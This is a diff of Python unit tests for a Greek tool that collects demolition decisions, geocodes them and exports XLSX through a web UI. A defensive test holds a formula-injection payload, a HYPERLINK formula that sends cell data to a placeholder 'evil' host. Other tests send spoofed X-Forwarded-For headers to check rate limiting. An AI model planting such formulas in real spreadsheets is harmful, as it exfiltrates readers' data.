@@ -70,6 +70,33 @@ class TestResolveArea(unittest.TestCase):
         with self.assertRaises(AreaError):
             resolve_area("  ", CACHE)
 
+    def test_amfisimo_suffix_perifereias(self):
+        """Γενική που ταιριάζει σε >1 περιφέρειες κατά κατάληξη πρέπει να
+        σφάλλει όπως οι ομώνυμοι δήμοι — όχι να κερδίζει σιωπηλά η πρώτη
+        («Ελλάδας» έδινε ΜΟΝΟ τη Στερεά, «Μακεδονίας» ΜΟΝΟ την Κεντρική,
+        «Αιγαίου» ΜΟΝΟ το Βόρειο)."""
+        candidates = {
+            "Ελλάδας": ("ΣΤΕΡΕΑΣ ΕΛΛΑΔΑΣ", "ΔΥΤΙΚΗΣ ΕΛΛΑΔΑΣ"),
+            "Μακεδονίας": ("ΚΕΝΤΡΙΚΗΣ ΜΑΚΕΔΟΝΙΑΣ", "ΔΥΤΙΚΗΣ ΜΑΚΕΔΟΝΙΑΣ"),
+            "Αιγαίου": ("ΒΟΡΕΙΟΥ ΑΙΓΑΙΟΥ", "ΝΟΤΙΟΥ ΑΙΓΑΙΟΥ"),
+        }
+        for q, expected in candidates.items():
+            with self.assertRaises(AreaError) as ctx:
+                resolve_area(q, CACHE)
+            msg = str(ctx.exception)
+            self.assertIn("Διφορούμενη", msg, q)
+            for cand in expected:               # απαριθμεί τους υποψηφίους
+                self.assertIn(cand, msg, q)
+
+    def test_monosimanto_suffix_perifereias_epiluetai(self):
+        # μονοσήμαντη κατάληξη εξακολουθεί να δουλεύει (καμία παλινδρόμηση)
+        label, munis = resolve_area("Θράκης", CACHE)
+        self.assertEqual(label, "ΠΕΡΙΦΕΡΕΙΑ ΑΝΑΤΟΛΙΚΗΣ ΜΑΚΕΔΟΝΙΑΣ ΚΑΙ ΘΡΑΚΗΣ")
+        self.assertTrue(munis)
+        # και το πλήρες όνομα με κοινή κατάληξη παραμένει ΑΚΡΙΒΕΣ ταίριασμα
+        label, _ = resolve_area("Στερεάς Ελλάδας", CACHE)
+        self.assertEqual(label, "ΠΕΡΙΦΕΡΕΙΑ ΣΤΕΡΕΑΣ ΕΛΛΑΔΑΣ")
+
     def test_omonimoi_dimoi_me_prosdiorismo(self):
         _, kriti = resolve_area("Δήμος Ηρακλείου (Κρήτης)", CACHE)
         _, attiki = resolve_area("Δήμος Ηρακλείου (Αττικής)", CACHE)
@@ -270,6 +297,51 @@ class TestIssueDate(unittest.TestCase):
         self.assertEqual(issue_date({"issueDate": ts}).isoformat(), "2024-04-16")
 
 
+class TestFetchWindowCache(unittest.TestCase):
+    """Παράθυρο αναζήτησης που ΔΕΝ έχει κλείσει (win_end σήμερα ή μετά) δεν
+    μπαίνει στη cache — αλλιώς η μισή σημερινή μέρα «πάγωνε» και το ίδιο
+    διάστημα ξανασερβιριζόταν για πάντα χωρίς τις νεότερες πράξεις."""
+
+    def _fake_response(self):
+        from unittest import mock
+        r = mock.Mock()
+        r.raise_for_status = mock.Mock()
+        r.json.return_value = {"info": {"actualSize": 1},
+                               "decisions": [{"ada": "X"}]}
+        return r
+
+    def _run_twice(self, win_start, win_end, tmp):
+        from unittest import mock
+        from demolitions import diavgeia
+        with mock.patch.object(diavgeia.session, "get",
+                               return_value=self._fake_response()) as get, \
+             mock.patch.object(diavgeia.time, "sleep"):
+            d1 = diavgeia._fetch_window(win_start, win_end, tmp)
+            d2 = diavgeia._fetch_window(win_start, win_end, tmp)
+        self.assertEqual(d1, [{"ada": "X"}])
+        self.assertEqual(d2, [{"ada": "X"}])
+        return get.call_count, list((Path(tmp) / "search").glob("*.json"))
+
+    def test_anoixto_parathyro_den_cachearetai(self):
+        from datetime import timedelta
+        from demolitions.diavgeia import GREECE_TZ
+        today = datetime.now(GREECE_TZ).date()
+        with tempfile.TemporaryDirectory() as tmp:
+            calls, files = self._run_twice(today - timedelta(days=5), today, tmp)
+        self.assertEqual(calls, 2)          # ξαναρωτά το API, όχι τη cache
+        self.assertEqual(files, [])         # και δεν γράφει τίποτα στον δίσκο
+
+    def test_kleisto_parathyro_cachearetai(self):
+        from datetime import timedelta
+        from demolitions.diavgeia import GREECE_TZ
+        yesterday = datetime.now(GREECE_TZ).date() - timedelta(days=1)
+        with tempfile.TemporaryDirectory() as tmp:
+            calls, files = self._run_twice(
+                yesterday - timedelta(days=5), yesterday, tmp)
+        self.assertEqual(calls, 1)          # η δεύτερη φορά από τη cache
+        self.assertEqual(len(files), 1)
+
+
 class TestEgsa87(unittest.TestCase):
     def test_drama(self):
         lat, lon = egsa87_to_wgs84(512801.149, 4555388.78)
@@ -413,6 +485,36 @@ class TestGeocodeHelpers(unittest.TestCase):
         self.assertEqual(_poli_variants("Δράμα", "Δράμας"), ["Δράμα"])
         self.assertEqual(_poli_variants("", "Δράμας"), [])
 
+    def test_geocode_row_kratari_odo_xoris_poli(self):
+        """poli="" δεν πρέπει να πετά την οδό: «Ερμού 10» χωρίς Πόλη/Οικισμό
+        γεωκωδικοποιείται με ακρίβεια «οδός+αριθμός», όχι «δήμος»."""
+        from unittest import mock
+        from demolitions import geocode
+        row = {"odos": "Ερμού", "ar_apo": "10", "poli": ""}
+        with tempfile.TemporaryDirectory() as tmp:
+            g = geocode.Geocoder(tmp)
+            queries = []
+
+            def fake_query(q):
+                queries.append(q)
+                return [37.976, 23.726] if q.startswith("Ερμού 10") else None
+
+            with mock.patch.object(g, "_query", side_effect=fake_query):
+                lat, lon, prec = g.geocode_row(row, "Δήμος Αθηναίων")
+            self.assertEqual((lat, lon), (37.976, 23.726))
+            self.assertEqual(prec, "οδός+αριθμός")
+            self.assertEqual(queries[0], "Ερμού 10, Δήμος Αθηναίων, Ελλάδα")
+
+            # αν η οδός δεν βρεθεί πουθενά, το fallback στον δήμο παραμένει
+            queries.clear()
+            with mock.patch.object(g, "_query",
+                                   side_effect=lambda q: queries.append(q)):
+                lat, lon, prec = g.geocode_row(row, "Δήμος Αθηναίων")
+            self.assertEqual(prec, "")
+            self.assertEqual(queries, ["Ερμού 10, Δήμος Αθηναίων, Ελλάδα",
+                                       "Ερμού, Δήμος Αθηναίων, Ελλάδα",
+                                       "Δήμος Αθηναίων, Ελλάδα"])
+
     def test_transient_failures_do_not_become_cached_misses(self):
         from unittest import mock
         from demolitions import geocode
@@ -500,6 +602,43 @@ class TestOutput(unittest.TestCase):
             # το βασικό pivot μετρά μόνο τις αυτοτελείς
             self.assertEqual(wb["Ανά έτος-δήμο"].cell(3, 3).value, 1)
             self.assertEqual(wb["Οικοδομικές με κατεδάφιση"].cell(3, 3).value, 1)
+
+
+class TestXlsxFormulaInjection(unittest.TestCase):
+    """Κείμενο τρίτων (από τα PDF των αιτούντων) που αρχίζει με = + - @ δεν
+    πρέπει ΠΟΤΕ να αποθηκεύεται ως τύπος Excel — το openpyxl μετατρέπει το
+    «=…» σε formula (data_type 'f') που εκτελείται στο Excel του αναγνώστη."""
+
+    def test_ypopta_prothemata_menoyn_keimeno(self):
+        from openpyxl import load_workbook
+        evil = {
+            "perigrafi": '=HYPERLINK("http://evil/"&A1,"open")',
+            "odos": "=1+2",
+            "poli": "+30 6900000000",
+            "dim_enotita": "-ΚΕΝΤΡΟ",
+            "kaek": "@SUM(A1:A9)",
+        }
+        rows = [{"ada": "ΑΔΑ1", "url": "u/ΑΔΑ1", "date": "2021-01-15",
+                 "year": 2021, "dimos": "=Δήμος Δράμας", "ar_apo": "",
+                 "ar_eos": "", "ot": "", "orofoi": None, "lat": None,
+                 "lon": None, "precision": "", "parse_ok": True,
+                 "pdf_path": "", "flags": "", **evil}]
+        col = {key: i for i, (_, key, _) in enumerate(COLUMNS, 1)}
+        buf = io.BytesIO()
+        write_xlsx(rows, buf)
+        buf.seek(0)
+        wb = load_workbook(buf)
+        ws = wb["Κατεδαφίσεις"]
+        for key, raw in {**evil, "dimos": "=Δήμος Δράμας"}.items():
+            cell = ws.cell(2, col[key])
+            self.assertNotEqual(cell.data_type, "f", key)   # όχι formula
+            self.assertEqual(cell.data_type, "s", key)       # απλό κείμενο
+            # η τιμή σώζεται αυτούσια — χωρίς ορατό escape (π.χ. «'=»)
+            self.assertEqual(cell.value, raw, key)
+        # και στο pivot, όπου τα ονόματα δήμων γίνονται επικεφαλίδες στηλών
+        pivot = wb["Ανά έτος-δήμο"]
+        self.assertEqual(pivot.cell(1, 2).value, "=Δήμος Δράμας")
+        self.assertNotEqual(pivot.cell(1, 2).data_type, "f")
 
 
 class TestRunsConsistency(unittest.TestCase):
@@ -1808,6 +1947,57 @@ class TestWebUI(unittest.TestCase):
         self.assertNotIn(("2.2.2.2", "zip"), w.rate_hits)
         self.assertIn(("9.9.9.9", "run"), w.rate_hits)
 
+    def test_client_ip_pairnei_to_teleutaio_xff(self):
+        # πίσω από έναν έμπιστο proxy μόνο το ΤΕΛΕΥΤΑΙΟ XFF είναι αξιόπιστο —
+        # τα αριστερά τα γράφει ο πελάτης (spoofable)
+        w = self.webui
+        with w.app.test_request_context(
+                environ_base={"REMOTE_ADDR": "10.0.0.1"},
+                headers={"X-Forwarded-For": "6.6.6.6, 203.0.113.5"}):
+            self.assertEqual(w._client_ip(), "203.0.113.5")
+        with w.app.test_request_context(environ_base={"REMOTE_ADDR": "10.0.0.1"}):
+            self.assertEqual(w._client_ip(), "10.0.0.1")   # χωρίς XFF
+        with w.app.test_request_context(
+                environ_base={"REMOTE_ADDR": "10.0.0.1"},
+                headers={"X-Forwarded-For": "6.6.6.6,"}):   # κακοσχηματισμένο
+            self.assertEqual(w._client_ip(), "10.0.0.1")
+
+    def test_rate_limit_den_parakampetai_me_spoofed_xff(self):
+        # εναλλασσόμενο αριστερό XFF ανά αίτημα ΔΕΝ δίνει φρέσκο bucket: ο
+        # proxy προσθέτει την πραγματική IP τελευταία και αυτή μετράει
+        self.webui.RATE_LIMIT_WINDOW_SECONDS = 3600
+        self.webui.RATE_LIMIT_MAX_REQUESTS = 1
+        r1 = self.client.get(self._url("/zip/<rid>.zip"),
+                             headers={"X-Forwarded-For": "1.1.1.1, 203.0.113.9"})
+        self.assertEqual(r1.status_code, 200)
+        r2 = self.client.get(self._url("/zip/<rid>.zip"),
+                             headers={"X-Forwarded-For": "2.2.2.2, 203.0.113.9"})
+        self.assertEqual(r2.status_code, 429)
+
+    def test_delete_endpoints_rate_limited(self):
+        # τα (μη αυθεντικοποιημένα) DELETE μοιράζονται δικό τους bucket ώστε
+        # να μην σφυροκοπούν τα delete-object του R2 χωρίς όριο
+        self.webui.RATE_LIMIT_WINDOW_SECONDS = 3600
+        self.webui.RATE_LIMIT_MAX_REQUESTS = 2
+        codes = [self.client.delete("/api/pdfs").status_code for _ in range(3)]
+        self.assertEqual(codes[-1], 429)
+        # ίδιο bucket για όλα τα DELETE: και το /api/runs μπλοκάρεται ήδη
+        r = self.client.delete("/api/runs")
+        self.assertEqual(r.status_code, 429)
+        self.assertIn("Retry-After", r.headers)
+        # το run δεν διαγράφηκε από το μπλοκαρισμένο αίτημα
+        self.assertTrue(self.webui.store.exists(self.RID))
+
+    def test_serve_run_file_rate_limited(self):
+        # το /runs/<id>/... streamάρει μέσω του metered host — έχει όριο
+        self.webui.RATE_LIMIT_WINDOW_SECONDS = 3600
+        self.webui.RATE_LIMIT_MAX_REQUESTS = 1
+        url = self._url("/runs/<rid>/<rid>.xlsx")
+        self.assertEqual(self.client.get(url).status_code, 200)
+        r2 = self.client.get(url)
+        self.assertEqual(r2.status_code, 429)
+        self.assertIn("Retry-After", r2.headers)
+
     def test_zip_manifest_server_mode_local(self):
         # τοπικός store -> πάντα server-side zip (δεν υπάρχει presigning)
         m = self.client.get(self._url("/api/runs/<rid>/zip-manifest")).get_json()
@@ -1829,6 +2019,17 @@ class TestWebUI(unittest.TestCase):
         self.assertIn("/xlsx-filtered", html)                # POST endpoint
         self.assertIn("__demolitionsFilter", html)           # γέφυρα classic→module
         self.assertIn('type="module"', html)                 # ESM import
+
+    def test_filtered_download_guard_on_zero_match(self):
+        """Φίλτρο με 0 αποτελέσματα δεν πρέπει να κατεβάζει ΟΛΟ το run ως
+        «φιλτραρισμένο»: το κουμπί κρύβεται και ο handler κόβει το κενό ada
+        (server-side το κενό φίλτρο σημαίνει «χωρίς φίλτρο» -> πλήρες zip)."""
+        html = self.client.get("/").get_data(as_text=True)
+        # ορατότητα: κρυφό όταν δεν φιλτράρεται κάτι Ή δεν μένει καμία γραμμή
+        self.assertIn('"hidden", !active || !view.length', html)
+        # φράχτης στον handler: ρητά κενό υποσύνολο -> μήνυμα, όχι POST
+        self.assertIn("f.ada.length === 0", html)
+        self.assertIn("Κανένα αποτέλεσμα με τα τρέχοντα φίλτρα.", html)
 
 
 if __name__ == "__main__":
